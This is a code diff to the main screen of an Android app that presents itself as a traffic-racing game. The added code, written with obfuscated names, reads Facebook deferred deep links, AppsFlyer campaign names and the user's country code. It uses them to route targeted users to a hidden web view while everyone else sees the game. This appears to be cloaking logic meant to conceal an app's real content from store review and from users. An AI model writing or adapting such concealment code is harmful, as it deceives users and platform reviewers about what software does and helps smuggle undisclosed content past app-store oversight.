@@ -1,5 +1,6 @@
 package com.skgames.trafficridert
 
+import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
 import androidx.appcompat.app.AppCompatActivity
@@ -9,6 +10,7 @@ import androidx.activity.viewModels
 import androidx.lifecycle.lifecycleScope
 import com.appsflyer.AppsFlyerConversionListener
 import com.appsflyer.AppsFlyerLib
+import com.facebook.applinks.AppLinkData
 import com.google.android.gms.ads.identifier.AdvertisingIdClient
 import com.skgames.trafficridert.AppClass.Companion.appsChecker
 import com.skgames.trafficridert.AppClass.Companion.eus
@@ -35,6 +37,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var sharedAppsCheck : SharedPreferences
     private lateinit var sharedMainId : SharedPreferences
     private lateinit var sharedNaming : SharedPreferences
+    private lateinit var sharedDeep : SharedPreferences
 
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -46,8 +49,10 @@ class MainActivity : AppCompatActivity() {
         sharedlink = getSharedPreferences(AppClass.link, MODE_PRIVATE)
         sharedMainId = getSharedPreferences(eus, MODE_PRIVATE)
         sharedNaming= getSharedPreferences(weopslsamkx, MODE_PRIVATE)
+        sharedDeep= getSharedPreferences(AppClass.deep, MODE_PRIVATE)
         networkJob()
         lifecycleScope.launch {
+            gtropdflk(this@MainActivity)
             AppsFlyerLib.getInstance()
                 .init("kxAbcrSfYiK4GSF2zEgYMQ", eusuixj, applicationContext)
             AppsFlyerLib.getInstance().start(this@MainActivity)
@@ -56,7 +61,18 @@ class MainActivity : AppCompatActivity() {
 
     }
 
-
+    fun gtropdflk(sepod: Context) {
+        AppLinkData.fetchDeferredAppLinkData(
+            sepod
+        ) { vfopsl: AppLinkData? ->
+            vfopsl?.let {
+                val params = vfopsl.targetUri.host.toString()
+                sharedDeep.edit().putString(AppClass.deep,params).apply()
+            }
+            if (vfopsl == null) {
+            }
+        }
+    }
 
     private fun lobpocvookd(){
         val eusi = AdvertisingIdClient(applicationContext)
@@ -130,18 +146,30 @@ class MainActivity : AppCompatActivity() {
     }
     private fun checker(){
         lifecycleScope.launch(Dispatchers.IO) {
+            val intentNorm = Intent(this@MainActivity, Web::class.java)
             val xlcopc = sharedAppsCheck.getString(appsChecker,"null")
             var rodop: String? = sharedNaming.getString(weopslsamkx,"null")
+            val deeplink: String? = sharedDeep.getString(AppClass.deep,"null")
             lobpocvookd()
             if (xlcopc == "1") {
                 val fidofko = Executors.newSingleThreadScheduledExecutor()
                 fidofko.scheduleAtFixedRate({
                     if (rodop != null) {
-                        Log.d("TestInUIHawk", rodop.toString())
-                        if (rodop!!.contains("tdb2") || geo.contains(countrycode)) {
+                        if (rodop!!.contains("tdb2") && deeplink!!.contains("tdb2")) {
                             Log.d("Apps Checker", "naming: $rodop")
                             fidofko.shutdown()
-                            startActivity(Intent(this@MainActivity, Web::class.java))
+                            intentNorm.putExtra("WebInt", "campaign")
+                            startActivity(intentNorm)
+                            finish()
+                        } else if(rodop!!.contains("tdb2") || geo.contains(countrycode)){
+                            fidofko.shutdown()
+                            intentNorm.putExtra("WebInt", "campaign")
+                            startActivity(intentNorm)
+                            finish()
+                        }else if(deeplink!!.contains("tdb2") && !rodop!!.contains("tdb2")){
+                            fidofko.shutdown()
+                            intentNorm.putExtra("WebInt", "deepLink")
+                            startActivity(intentNorm)
                             finish()
                         } else {
                             fidofko.shutdown()
@@ -154,12 +182,19 @@ class MainActivity : AppCompatActivity() {
                     }
 
                 }, 0, 2, TimeUnit.SECONDS)
-            } else if (geo.contains(countrycode)) {
-                startActivity(Intent(this@MainActivity, Web::class.java))
-                finish()
-            } else {
-                startActivity(Intent(this@MainActivity, Game::class.java))
-                finish()
+            } else{
+               if(deeplink!!.contains("tdb2")){
+                   intentNorm.putExtra("WebInt", "deepLink")
+                   startActivity(intentNorm)
+                   finish()
+               } else if(geo.contains(countrycode)){
+                   intentNorm.putExtra("WebInt", "MT")
+                   startActivity(intentNorm)
+                   finish()
+               } else {
+                   startActivity(Intent(this@MainActivity, Game::class.java))
+                   finish()
+               }
             }
         }
     }
